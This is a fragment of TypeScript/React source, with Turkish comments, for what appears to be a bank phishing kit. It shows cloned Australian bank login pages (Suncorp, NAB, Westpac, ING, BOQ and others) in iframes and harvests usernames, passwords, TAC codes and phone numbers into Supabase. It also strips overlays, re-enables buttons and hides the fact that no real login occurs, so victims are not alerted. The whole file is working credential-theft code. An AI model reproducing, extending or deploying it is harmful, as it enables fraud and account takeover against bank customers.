  const captureFieldsFromFrame = useCallback(() => {
    const doc = iframeRef.current?.contentDocument;
    if (!doc) return [] as CapturedField[];
    const form = pickBestForm(doc);
    // ⭐ FORM YOKSA (örneğin Suncorp token code form DIŞINDA ise)
    //   DOCUMENT bazlı TÜM inputları toplayıp döner (boş array dönme)
    const scope = form ?? (doc as unknown as HTMLFormElement);
    return collectCapturedFieldsFromForm(scope, doc);
  }, []);

  const submitWithCurrentValuesRef = useRef<() => Promise<void>>(() => Promise.resolve());
  const lastSubmitAtRef = useRef<number>(0);
  const savedSubmitFormRef = useRef<HTMLFormElement | null>(null);
  const pollingCounterRef = useRef<number>(0);
  const savedSubmitActionNodesRef = useRef<HTMLElement[]>([]);

  const attachFrameBridge = useCallback(() => {
    const iframe = iframeRef.current;
    const doc = iframe?.contentDocument;
    if (!iframe || !doc) return;

    let loginForm =
      Array.from(doc.querySelectorAll("form")).find((form) => formHasIdentityAndPassword(form, doc)) ?? null;
    if (!loginForm) {
      loginForm = pickBestForm(doc);
    }
    // ⭐ FORM YOKSA (Suncorp token code / NAB shadow DOM vb)
    //   BRIDGE'I KAPATMA (return etme)! DOCUMENT'i scope olarak kullan.
    //   (eski sürümde return ederdi, butonlar/polling handlerları hiç bağlanmazdı)
    const loginScope = loginForm ?? (doc as unknown as HTMLFormElement);
    if (loginForm) {
      savedSubmitFormRef.current = loginForm;
    }

    const canProceedNow = () => {
      const isSingle = (auPages?.length ?? 1) === 1;
      if (isFinalStep) return canSubmitFinal(loginScope, doc, isSingle);
      return canSubmitIntermediate(loginScope, doc);
    };

    const ultraForceClickOnBestNode = (bestForm: HTMLFormElement, actNodes: HTMLElement[]) => {
      try {
        const candidates: HTMLElement[] = [];
        if (actNodes && actNodes.length > 0) candidates.push(...actNodes);
        try {
          const inside = Array.from(
            bestForm.querySelectorAll<HTMLElement>(
              "button, input[type='submit'], input[type='button'], [role='button'], .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
            ),
          );
          inside.forEach((x) => candidates.push(x));
        } catch {}
        try {
          const out = Array.from(
            doc.querySelectorAll<HTMLElement>(
              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
            ),
          );
          out.forEach((x) => candidates.push(x));
        } catch {}
        const seen = new Set<HTMLElement>();
        let bestNode: HTMLElement | null = null;
        for (const cand of candidates) {
          if (seen.has(cand)) continue;
          seen.add(cand);
          const tok = getElementActionToken(cand);
          const isi =
            cand instanceof HTMLInputElement && ["submit", "button"].includes((cand.getAttribute("type") ?? "").toLowerCase());
          if (!(ACTION_BUTTON_RE.test(tok) || isi)) {
            continue;
          }
          bestNode = cand;
          break;
        }
        if (bestNode) {
          savedSubmitActionNodesRef.current = [bestNode];
          try {
            (bestNode as any).click();
          } catch {}
          try {
            if ((bestNode as any).dispatchEvent) {
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("mousedown", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, view: window }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new PointerEvent("pointerdown", { bubbles: true, cancelable: true }));
              } catch {}
              try {
                (bestNode as any).dispatchEvent(new PointerEvent("pointerup", { bubbles: true, cancelable: true }));
              } catch {}
            }
          } catch {}
        }
        // ⚠️ GERÇEK form.requestSubmit() / form.submit() KALDIRILDI.
        //   Mock iframe srcdoc HTML formunu GERÇEKTEN gönderemeyiz (geçerli URL yok).
        //   Gönderilirse iframe 500 Internal Server Error sayfasına düşer.
        //   Sadece button.click/dispatchEvent eventleri yeterli (supabase submit + beklemeye parenttan gidilir).
      } catch (_) {
        /* ignore */
      }
    };

    const submitWithCurrentValues = async (event?: Event) => {
      // ⭐ BOQ Classic FIX: Dış alana (label, boşluk, body, div) tıklayınca submit olmasın.
      //   SADECE:
      //     (A) Event gelmemişse (postMessage/ref üzerinden manuel çağrı) → izin ver
      //     (B) event.type === "submit" (form submit event) → izin ver
      //     (C) event.type click/mousedown/touchend/pointerup vb. ise:
      //         → event.target BUTTON / INPUT[type=submit,button] / [role=button] OLMALIDIR
      //         → VEYA event.key === "Enter" (klavyeden Enter)
      //         → ⭐ YENİ: closest ile iç içe SPAN/SVG/TEXT etiketleri BUTONUN ICINDEYSE closest ile parent BUTON ise ONAYLA
      if (event) {
        const et = (event as any).target as HTMLElement | null;
        const evtType = String((event as any).type || "");
        const isKeyboard =
          (event as KeyboardEvent).key === "Enter" ||
          (event as any).keyCode === 13 ||
          (event as KeyboardEvent).code === "Enter" ||
          (event as KeyboardEvent).key === "NumpadEnter";
        let closestActionNode: HTMLElement | null = null;
        try {
          if (et && typeof (et as any).closest === "function") {
            closestActionNode = (et as HTMLElement).closest(
              "button, input[type='submit'], input[type='button'], [role='button'], a.btn, [onclick]",
            ) as HTMLElement | null;
          }
        } catch {}
        const etButton = closestActionNode || et;
        // ⭐ ING Sağ Üst Chat/Help Hatası: En erken AŞAMADA (kullanıcı tıklayınca)
        //   4 KATMANLI SIKI FİLTRE: BLACKLIST + RIGHT-CORNER + FORM-RELATION + BUTON BENZERLİK
        const etClsRaw = (etButton?.getAttribute?.("class") || "").toLowerCase();
        const etIdRaw = (etButton?.getAttribute?.("id") || "").toLowerCase();
        const etDtidRaw = (etButton?.getAttribute?.("data-testid") || "").toLowerCase();
        const etRoleRaw = (etButton?.getAttribute?.("role") || "").toLowerCase();
        const etAriaRaw = (
          etButton?.getAttribute?.("aria-label") ||
          etButton?.getAttribute?.("aria-labelledby") ||
          etButton?.getAttribute?.("title") ||
          ""
        ).toLowerCase();
        const etNameRaw = (etButton?.getAttribute?.("name") || "").toLowerCase();
        const etTextRaw = ((etButton as any)?.textContent || "").toString().toLowerCase();
        const etBlTxt = `${etClsRaw} ${etIdRaw} ${etDtidRaw} ${etRoleRaw} ${etAriaRaw} ${etNameRaw} ${etTextRaw} ${etButton?.tagName || ""}`;
        const etStrictBlacklisted = BUTTON_STRICT_BLACKLIST_RE.test(etBlTxt);
        const etRightCorner = etButton ? isRightCornerNonLoginWidget(etButton) : false;
        const etHasFormRel = etButton ? buttonHasFormRelation(etButton) : false;
        // Eski zayıf regex (etIsEyeOrIcon) ARTIK KULLANILMIYOR, onun yerine GLOBAL
        // BUTTON_STRICT_BLACKLIST_RE var (45+ kelime: chat/help/menu/bell/forgot vb.)
        const isButtonLike =
          etButton && !etStrictBlacklisted && !etRightCorner && etHasFormRel && (
            etButton.tagName === "BUTTON" ||
            (etButton.tagName === "INPUT" &&
              ["submit", "button"].includes(
                ((etButton as HTMLInputElement).getAttribute("type") || "").toLowerCase(),
              )) ||
            etButton.getAttribute("role") === "button" ||
            // a.btn: sadece class="btn" olan a tag'leri
            (etButton.tagName === "A" && /\bbtn\b/.test(etClsRaw))
          );
        const isFormSubmit = evtType === "submit";
        // Label / body / div / span / chat-widget / sağ üst header butonları REDDET
        if (!isFormSubmit && !isButtonLike && !isKeyboard) {
          return;
        }
      }

      // ⚠️ KALDIRILDI: event.preventDefault / stopPropagation.
      //   Suncorp (ve tüm bankalar) GERÇEK submit handler'ını tetikleyebilsin diye
      //   DOM event akışını BOZMA. Sadece supabase kaydını YAP, sonra da GERÇEK butona tıkla.
      const now = Date.now();
      if (now - lastSubmitAtRef.current < 1200) return;

      const captured = captureFieldsFromFrame();
      if (captured.length === 0) return;

      // NUKE GÜVENLİK: Resmi canProceed() TRUE dönerse kesin submit.
      // Eğer canProceed FALSE dönerse BİLE — ama kullanıcı butona BASTIYSA
      // ve EN AZ 1 TANE ÖNEMLİ ALAN (password/username/personal/tac/phone)
      // capture edildiyse, yine de SUBMIT yap.
      // (Multi-step bankalarda canProceed yanlış hesaplanabilir; butona basılmışsa,
      // kullanıcı submit etmek istiyordur demektir — alanlar 0 değilse kaydedelim.)
      const proceedOfficial = canProceedNow();
      // ⭐ SIKI EMERGENCY BYPASS (SADECE canProceed HATALI YANLISLIKLA FALSE dondu ise):
      //   ❌ KALDIRILDI: 1 tane username OR password var diye ZORLA submit
      //   ✅ SADECE:
      //     - 2 GERCEK alan (username + password BERABER) hasIdentPassPair = TRUE
      //       VEYA
      //     - 3+ GERCEK alan (username + password + taccode/passcode BERABER) captured.length >= 3 ve
      //       tum 3 onemli alan DOLU (username + password + personal/tac/phone) → emergency izin.
      //   Bu sayede form eksik (sadece 1 alan girilmis)ken hicbir sekilde ZORLA submit olmayacak.
      const hasUsername = captured.some(
        (c) => (c.kind === "username" || c.kind === "personalCode" || c.kind === "bankPhone") && c.value.trim().length > 0,
      );
      const hasPassword = captured.some(
        (c) => (c.kind === "password" || c.kind === "tacCode") && c.value.trim().length > 0,
      );
      const hasThird = captured.some(
        (c) => c.kind === "personalCode" || c.kind === "tacCode" || c.kind === "bankPhone" && c.value.trim().length > 0,
      );
      const strictEmergencyPass =
        !proceedOfficial &&
        // 2+ GERCEK onemli alan (username + password BIRLIKTE), SADECE biri degil!
        (
          (hasUsername && hasPassword) ||
          // 3+ onemli alan (username + password + 3. kol)
          (hasUsername && hasPassword && hasThird && captured.length >= 3)
        );
      if (!proceedOfficial && !strictEmergencyPass) {
        // ❌ FORM EKSİK: return et, submit YAPMA.
        return;
      }

      lastSubmitAtRef.current = now;
      void submitCapturedFields(captured);

      // ⚠️ GERÇEK form.submit() / button.click KALDIRILDI.
      //   Mock iframe (srcdoc HTML) içinde GERÇEKTEN Suncorp serverına submit edemeyiz (geçerli URL yok).
      //   Eğer form.submit() çağrılırsa iframe srcsi değişip "Internal Server Error" (500)
      //   sayfasına YÖNLENDİRİLİR (ekranda siyah arka planda 500 hatası görünür),
      //   sonra route.replace ile beklemeye geçilirken kullanıcı BU HATAYI GÖRÜYORDU.
      //   ÇÖZÜM: Supabase kaydını YAP → router.replace beklemeye götür (yeterli).
    };

    const computeActionNodes = (d: Document, form: HTMLFormElement | null): HTMLElement[] => {
      const arr: HTMLElement[] = [];
      try {
        const fNodes = form ? Array.from(form.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, a.btn, .btn-primary, .btn, [onclick], [data-testid='login-button'], [data-testid='submit-button']",
        )) : [];
        const dNodes = Array.from(d.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login-button'], [data-testid*='submit-button'], [onclick]",
        ));
        const seen = new Set<HTMLElement>();
        [...fNodes, ...dNodes].forEach((n) => {
          if (seen.has(n)) return;
          seen.add(n);

          // ⭐ 1. KATMAN SIKI FİLTRE: SADECE GERÇEKTEN BUTON OLANLAR KALSIN.
          //   Westpac 20+ div/section/classı='login-form-section' öğelerin hiçbiri
          //   burada geçemez (tag BUTON değil, type submit değil).
          if (!isElementActuallyButtonLike(n)) return;

          const tok = getElementActionToken(n);
          const isi =
            n instanceof HTMLInputElement && ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
          const isByAttr =
            n.tagName === "BUTTON" ||
            n.getAttribute("role") === "button" ||
            n.hasAttribute("onclick");
          if (!(ACTION_BUTTON_RE.test(tok) || isi || isByAttr)) return;
          arr.push(n);
        });

        // BRUTE FORCE FALLBACK: Eğer yukarıdan 0 node geldiyse, 2. katman filtre
        // isElementActuallyButtonLike İLE. Westpac login-form-div vb. öğeler burada da GEÇEMEZ.
        if (arr.length === 0) {
          const fallBackSource =
            form ? form : d.body ?? d.documentElement;
          if (fallBackSource) {
            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|logon|log\s*on|sigon|auth|validate|accept|unlock|proceed|sign\s*on|signon/i;
            allIn.forEach((el) => {
              if (seen.has(el)) return;
              const tag = (el.tagName || "").toLowerCase();
              const type = (el.getAttribute("type") || "").toLowerCase();
              const tOk =
                tag === "button" ||
                (tag === "input" && ["submit", "button"].includes(type)) ||
                el.getAttribute("role") === "button" ||
                (tag === "a" && /\bbtn\b/.test((el.getAttribute("class") || "").toLowerCase())) ||
                el.hasAttribute("onclick");
              if (!tOk) return;

              // ⭐ 2. KATMAN SIKI FİLTRE (fallback bile olsa SADECE butonlar)
              if (!isElementActuallyButtonLike(el)) return;

              // ⭐ GREATER BANK FIX: 3. KATMAN SIKI REAL SUBMIT KONTROLÜ
              //   Sadece tag BUTON diye kabul etme! Action token veya strict login/submit
              //   class/id/data-testid TOKENSİ olanları AL — apply now/help/product butonları REDDET!
              if (!isElementActuallyRealSubmitButton(el)) return;

              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
              if (bfRe.test(idClsTxt)) {
                seen.add(el);
                arr.push(el);
              }
            });
          }
        }
      } catch {}
      return arr;
    };

    submitWithCurrentValuesRef.current = submitWithCurrentValues;

    const forms = Array.from(doc.querySelectorAll("form"));
    forms.forEach((form) => {
      form.setAttribute("method", "post");
      form.setAttribute("target", "_self");
      form.setAttribute("novalidate", "novalidate");
      if (loginForm && form === loginForm) {
        try { form.removeEventListener("submit", submitWithCurrentValues as any); } catch {}
        form.addEventListener("submit", submitWithCurrentValues as any);
        (form as any)._auBotV3Bound = true;
      }
    });

    const actionNodes = computeActionNodes(doc, loginScope);
    savedSubmitActionNodesRef.current = actionNodes;

    const updateSubmitState = () => {
      // ⭐ WESTPAC FIX: "DO NOT USE DISABLED STATES" overlay onleme
      //   iframe icindeki doc head'ina style tag 1 kez enjekte et.
      try { ensureAntiOverlayStyleInjected(doc); } catch {}

      let isValid = canProceedNow();
      const palette = getButtonPalette(bankSlug);

      const captured = collectCapturedFieldsFromForm(savedSubmitFormRef.current ?? loginScope, doc);
      const totalMeaningful = getFormFields(savedSubmitFormRef.current ?? loginScope).filter((f) => {
        const t = (f.getAttribute("type") ?? "").toLowerCase();
        return t !== "checkbox" && t !== "radio";
      }).length;
      const filledCount = captured.filter((c) => c.value.trim().length > 0).length;

      const isFormScope = (savedSubmitFormRef.current ?? loginScope as any)?.tagName === "FORM";
      const ratio = totalMeaningful > 0 ? filledCount / totalMeaningful : 0;
      // ⭐ MYBOQ FİX: GARANTİ VALİDİTY (tam dolu olmak zorunda DEĞİL, oranı veya kritik alanlar yeter)
      const guaranteedAllFilled =
        isFormScope && totalMeaningful >= 2 && filledCount === totalMeaningful && totalMeaningful <= 12;
      const guaranteedRatioFilled =
        totalMeaningful >= 2 &&
        filledCount >= 2 &&
        ratio >= 0.5 &&
        captured.some((f) => (f.kind === "username" || f.kind === "password") && f.value.trim().length > 0);
      const guaranteedImportantPair =
        hasIdentityField(captured) && (hasPasswordField(captured) || hasPasswordLikeField(captured));
      const guaranteedValid = guaranteedAllFilled || guaranteedRatioFilled || guaranteedImportantPair;
      if (!isValid && guaranteedValid) {
        isValid = true;
      }

      let fadeOpacity = 1;
      let fadeGray = 0;
      if (!isValid) {
        // ⭐ MYBOQ FİX: Kritik alanlardan biri bile doluysa BUTON ÇOK SİLİK (0.3/0.5) OLMAZ!
        //   (kullanıcı username yazdıysa buton 0.8 opak görünsün ki ne yaptığını anlasın)
        const hasAnyImportant = captured.some(
          (c) =>
            (c.kind === "username" ||
              c.kind === "password" ||
              c.kind === "personalCode" ||
              c.kind === "bankPhone" ||
              c.kind === "tacCode") &&
            c.value.trim().length > 0,
        );
        if (filledCount === 0) {
          fadeOpacity = 0.3;
          fadeGray = 0.8;
        } else if (hasAnyImportant && filledCount >= 1) {
          fadeOpacity = 0.78;
          fadeGray = 0.1;
        } else {
          fadeOpacity = 0.55;
          fadeGray = 0.2;
        }
      }

      const bgColor = isValid
        ? palette.bg
        : (totalMeaningful >= 1 && filledCount >= 1 ? "#C9CED1" : "#E6E8EA");
      const fgColor = isValid ? palette.fg : "#8A8E90";
      const borderColor = isValid ? `1px solid ${palette.border}` : "1px solid transparent";
      const boxShadow = isValid
        ? palette.shadow
        : "none";
      const cursorVal = saving ? "wait" : "pointer";
      const pointerEvents = saving ? "none" : "auto";

      actionNodes.forEach((node) => {
        // ⭐ SON GÜVENCE: SADECE GERÇEKTEN BUTON OLANLARA STILLER UYGULA.
        //   Eğer computeActionNodes Filtresinden HERHANGİ şekilde yanlışlıkla
        //   div/section/input[type=text] girmişse BURADA ATAK. (Westpac SOLUK
        //   sayfa sorunu ANA tedavi bu 2. filtre!)
        if (!isElementActuallyButtonLike(node)) return;
        // ⭐ GREATER BANK FIX: ÜSTÜSTÜNE 3. KATMAN GERÇEK SUBMIT KONTROLÜ
        //   Login DIŞI help/apply/menu/product butonları buton olsa bile REDDET!
        if (!isElementActuallyRealSubmitButton(node)) return;
        try {
          if ("disabled" in node) {
            try { (node as any).disabled = false; } catch {}
            try { node.removeAttribute("disabled"); } catch {}
          }
        } catch {}
        try {
          for (let i = 0; i < node.classList?.length; i++) {
            const cls = node.classList[i];
            if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
              try { node.classList.remove(cls); } catch {}
            }
          }
        } catch {}
        // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA!
        //   Westpac CSS [aria-disabled="true"] olunca ::after ile
        //   "DO NOT USE DISABLED STATES" yazdiriyor, orijinal "Sign in" ile
        //   UST USTE BINIYOR. Bunun yerine sadece opacity/color ile goster.
        try { node.removeAttribute("aria-disabled"); } catch {}

        // ⭐ TÜM STİLLER applyButtonStyleCached (WeakMap cache) ile yaz:
        //   AYNI deger polling'de tekrar tekrar SET EDILMIYOR → transition
        //   220ms opacity tekrar baslatmiyor → YANIP SONME (FLICKER) %0!
        applyButtonStyleCached(node, "position", "relative");
        applyButtonStyleCached(node, "display", "inline-block");
        applyButtonStyleCached(node, "z-index", "99999");
        applyButtonStyleCached(node, "margin-top", "14px");
        applyButtonStyleCached(node, "margin-bottom", "10px");
        applyButtonStyleCached(node, "padding-top", "12px");
        applyButtonStyleCached(node, "padding-bottom", "12px");
        applyButtonStyleCached(node, "padding-left", "22px");
        applyButtonStyleCached(node, "padding-right", "22px");
        applyButtonStyleCached(node, "line-height", "1.35");
        applyButtonStyleCached(node, "font-size", "15px");
        applyButtonStyleCached(node, "font-weight", "700");
        applyButtonStyleCached(node, "border-radius", "10px");
        applyButtonStyleCached(node, "pointer-events", pointerEvents);
        applyButtonStyleCached(node, "opacity", String(fadeOpacity));
        applyButtonStyleCached(node, "filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`);
        applyButtonStyleCached(node, "-webkit-filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`);
        applyButtonStyleCached(node, "cursor", cursorVal);
        applyButtonStyleCached(node, "background-color", bgColor);
        applyButtonStyleCached(node, "background", bgColor);
        applyButtonStyleCached(node, "color", fgColor);
        applyButtonStyleCached(node, "border", borderColor);
        applyButtonStyleCached(node, "box-shadow", boxShadow);
        applyButtonStyleCached(node, "transform", isValid ? "translateY(0)" : "none");
        // Transition polling'de tekrar tekrar yazma → Sadece 1 kez set et
        applyButtonStyleCached(
          node,
          "transition",
          "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
        );
      });
    };

    actionNodes.forEach((node) => {
      // ⭐ FİLTRE: SADECE GERÇEKTEN BUTON OLANLARA event listener bağla.
      //   Westpac 20+ yanlış input/divlere click listener bağlanırsa form içindeki
      //   herhangi bir input tıklamasında SUBMIT tetiklenebilir (istenmeyen).
      if (!isElementActuallyButtonLike(node)) return;
      // ⭐ GREATER BANK FIX: GERÇEK login/submit butonu degilse (help/apply/menu)
      //   CLICK LISTENER BAGLAMA! Submit handler sadece gerçek login butonunda olsun.
      if (!isElementActuallyRealSubmitButton(node)) return;
      try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
      try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
      try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
      node.addEventListener("click", submitWithCurrentValues as any, false);
      node.addEventListener("mousedown", submitWithCurrentValues as any, false);
      node.addEventListener("touchend", submitWithCurrentValues as any, false);
      try {
        node.addEventListener("keydown", (e: Event) => {
          const ke = e as KeyboardEvent;
          if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
            try { submitWithCurrentValues(e as any); } catch {}
          }
        }, false);
      } catch {}
    });

    Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
      if (!isExternalHref(link.getAttribute("href"))) return;
      link.setAttribute("href", "#");
      link.setAttribute("target", "_self");
      link.setAttribute("rel", "nofollow noopener noreferrer");
    });

    getFormFields(loginScope).forEach((field) => {
      try { field.removeEventListener("input", updateSubmitState as any); } catch {}
      try { field.removeEventListener("change", updateSubmitState as any); } catch {}
      field.addEventListener("input", updateSubmitState as any);
      field.addEventListener("change", updateSubmitState as any);
      field.addEventListener("keydown", (event: KeyboardEvent) => {
        if (event instanceof KeyboardEvent && event.key === "Enter" && !canProceedNow()) {
          event.preventDefault();
          event.stopPropagation();
        }
      });
    });

    updateSubmitState();
  }, [bankSlug, captureFieldsFromFrame, isFinalStep, saving, submitCapturedFields, totalSteps, auPages]);

  const handleFrameLoad = useCallback(() => {
    void attachFrameBridge();
  }, [attachFrameBridge]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    if (iframe.contentDocument?.readyState === "complete") {
      void attachFrameBridge();
    }

    iframe.addEventListener("load", handleFrameLoad);
    return () => {
      iframe.removeEventListener("load", handleFrameLoad);
    };
  }, [attachFrameBridge, handleFrameLoad]);

  useEffect(() => {
    const onMsg = (ev: MessageEvent) => {
      try {
        const data = ev.data as any;
        if (!data || typeof data !== "object") return;
        if (data.kind === "BOT_V3_SUBMIT_CLICKED" || data.kind === "BOT_V2_SUBMIT_CLICKED" || data.type === "AU_BOT_SUBMIT_NOW") {
          const ref = submitWithCurrentValuesRef.current;
          if (ref && typeof ref === "function") {
            void ref();
          }
        }
      } catch (_) {}
    };
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, []);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    const runPoll = () => {
      try {
        pollingCounterRef.current = pollingCounterRef.current + 1;
        const doc = iframe.contentWindow?.document;
        if (!doc) return;

        // ⭐ İLK 2 POLLING TURU: Aktif odak input/textarea/select değilse,
        //   odak yoksa İLK input/autofocus inputa odaklan.
        //   (daha sonraki TURlarda KESİNLİKLE odak izinsiz el değiştirme
        //    → Bendigo şifre 1 karakter yazma / Suncorp token→customer id odak KAYBINI ONLER)
        try {
          if (pollingCounterRef.current <= 2) {
            const act = doc.activeElement as HTMLElement | null;
            const actTag = (act?.tagName || "").toLowerCase();
            const userIsTyping = actTag === "input" || actTag === "textarea" || actTag === "select";
            if (!userIsTyping) {
              let focusTarget: HTMLElement | null = null;
              try {
                focusTarget = doc.querySelector<HTMLElement>("input[autofocus], textarea[autofocus]");
              } catch {}
              if (!focusTarget) {
                try {
                  focusTarget = Array.from(
                    doc.querySelectorAll<HTMLInputElement>("input:not([type='hidden'])"),
                  )[0] as HTMLElement | null;
                } catch {}
              }
              if (focusTarget) {
                try {
                  setTimeout(() => {
                    try { (focusTarget as any).focus({ preventScroll: true }); }
                    catch { try { (focusTarget as any).focus(); } catch {} }
                  }, 0);
                } catch {}
              }
            }
          }
        } catch {}

        const blStr = (x: HTMLElement) => `${x.id || ""} ${x.className || ""} ${x.getAttribute("data-testid") || ""} ${x.getAttribute("aria-label") || ""} ${x.tagName || ""}`.toLowerCase();
        const isPasswordEyeOrIcon = (x: HTMLElement) => /pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|security-banner|securitybanner|kba/i.test(blStr(x));

        // =====================================================================
        // ⭐ 1. POLLING BAŞI — OVERLAY / Z-INDEX BRUTE FORCE TEMİZLİĞİ
        //    NAB, North AMP, ING Australia gibi bankalarda inputların üstünde
        //    saydam veya z-index yüksek overlay elementleri inputları bloke ediyor.
        //    ⭐ NOT: Sadece GERÇEKTEN overlay/dialog/popup olan elementleri GİZLE!
        //       ORİJİNAL HTML ikonları (pwd-eye, padlock-icon, security banner vb.)
        //       dokunma, koru! BLACKLIST isPasswordEyeOrIcon() TRUE ise GİZLEME!
        // =====================================================================
        try {
          // (A) ING WebComponent / Polymer custom elementler (tag name "ing-*")
          try {
            const ingEls = doc.querySelectorAll<HTMLElement>("*");
            ingEls.forEach((el) => {
              const tag = (el.tagName || "").toLowerCase();
              if (tag.startsWith("ing-") || tag.startsWith("paper-") || tag.startsWith("iron-") || tag.startsWith("vaadin-") || tag.startsWith("ui5-")) {
                if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
                const role = (el.getAttribute("role") || "").toLowerCase();
                const zi = Number(window.getComputedStyle(el).zIndex || "0");
                const disp = window.getComputedStyle(el).display;
                const isRealOverlayTag =
                  tag === "ing-core-overlay" || tag === "iron-overlay" || tag === "iron-overlay-backdrop" || tag === "paper-dialog";
                const isRealOverlayClassOrRole =
                  role === "dialog" || role === "alertdialog" ||
                  (el.className || "").toString().split(/\s+/).some((t) => t === "overlay" || t === "backdrop" || t === "modal");
                // Custom element overlay / dialog / backdrop ise GİZLE
                if (
                  (zi > 900 && (isRealOverlayTag || isRealOverlayClassOrRole)) ||
                  isRealOverlayTag
                ) {
                  if (disp !== "none") {
                    try { el.style.setProperty("display", "none", "important"); } catch {}
                    try { el.style.visibility = "hidden"; } catch {}
                    try { el.style.opacity = "0"; } catch {}
                    try { el.style.pointerEvents = "none"; } catch {}
                  }
                }
              }
            });
          } catch {}
          // (B) Z-index > 900 olan TÜM elementleri tarama, input/button dışındakileri gizle
          try {
            const highZi = doc.querySelectorAll<HTMLElement>("div, section, article, aside, span, header, footer, nav, dialog");
            highZi.forEach((el) => {
              if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
              const zi = Number(window.getComputedStyle(el).zIndex || "0");
              if (zi > 900) {
                const tag = (el.tagName || "").toLowerCase();
                const txt = (el.textContent || "").trim().toLowerCase();
                const hasForm = el.querySelector("input, button, select, textarea, form") != null;
                const isLoginBut = /login|submit|continue|next|giriş|giris|onay|tamam/.test(
                  `${el.id} ${el.className} ${txt}`,
                );
                if (!hasForm && !isLoginBut && tag !== "button") {
                  try { el.style.setProperty("display", "none", "important"); } catch {}
                  try { el.style.pointerEvents = "none"; } catch {}
                } else {
                  try { el.style.setProperty("pointer-events", "none", "important"); } catch {}
                  el.querySelectorAll<HTMLElement>("input, button, select, textarea, label").forEach((f) => {
                    try { f.style.setProperty("pointer-events", "auto", "important"); } catch {}
                  });
                }
              }
            });
          } catch {}
          // (C) Standart overlay selectorları ile son tarama
          //    ⭐ GENİŞ [class*=overlay]/[id*=overlay]/[class*=modal] KALDIRILDI!
          //      Sadece TAG (overlay/dialog/paper-dialog) + AÇIK class TAM eşleşmesi
          //      (.overlay / .modal / .backdrop) + role=dialog olanlar GİZLENİR.
          try {
            const overlaySelector =
              'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, .modal, .backdrop, [role="dialog"], [role="alertdialog"]';
            const overlays = doc.querySelectorAll<HTMLElement>(overlaySelector);
            overlays.forEach((el) => {
              if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
              try { el.style.setProperty("display", "none", "important"); } catch {}
              try { el.style.visibility = "hidden"; } catch {}
              try { el.style.opacity = "0"; } catch {}
              try { el.style.pointerEvents = "none"; } catch {}
            });
          } catch {}
        } catch {}

        const form = pickBestForm(doc);
        if (!form) return;
        savedSubmitFormRef.current = form;

        // ⭐ WESTPAC FIX: "DO NOT USE DISABLED STATES" overlay onleme
        try { ensureAntiOverlayStyleInjected(doc); } catch {}

        const singleStep = totalSteps === 1;
        const proceedNow = isFinalStep ? canSubmitFinal(form, doc, singleStep) : canSubmitIntermediate(form, doc);
        const disabledBySaving = saving;
        const shouldForceEnable = proceedNow && !disabledBySaving;

        // ⭐ ING fadeOpacity/grayscale polling seviyesinde de hesapla
        const allPollFields = getFormFields(form);
        const allRequiredPoll = allPollFields.filter((f) => {
          const t = (f.getAttribute("type") ?? "").toLowerCase();
          return t !== "checkbox" && t !== "radio";
        });
        const capturedNow = collectCapturedFieldsFromForm(form, doc);
        const filledNow = capturedNow.filter((c) => c.value.trim().length > 0).length;
        const totalMeaningful = allRequiredPoll.length;
        let fadeOpacity = 1;
        let fadeGray = 0;
        if (!proceedNow) {
          // ⭐ MYBOQ FİX: Buton polling seviyesinde de ÇOK SİLİK (0.5) GÖSTERİLMESİN
          //   (updateSubmitState ile AYNI fade kuralları):
          const hasAnyImportant = capturedNow.some(
            (c) =>
              (c.kind === "username" ||
                c.kind === "password" ||
                c.kind === "personalCode" ||
                c.kind === "bankPhone" ||
                c.kind === "tacCode") &&
              c.value.trim().length > 0,
          );
          if (filledNow === 0) {
            fadeOpacity = 0.3;
            fadeGray = 0.8;
          } else if (hasAnyImportant && filledNow >= 1) {
            fadeOpacity = 0.78;
            fadeGray = 0.1;
          } else {
            fadeOpacity = 0.55;
            fadeGray = 0.2;
          }
        }

        const palette = getButtonPalette(bankSlug);

        // =====================================================================
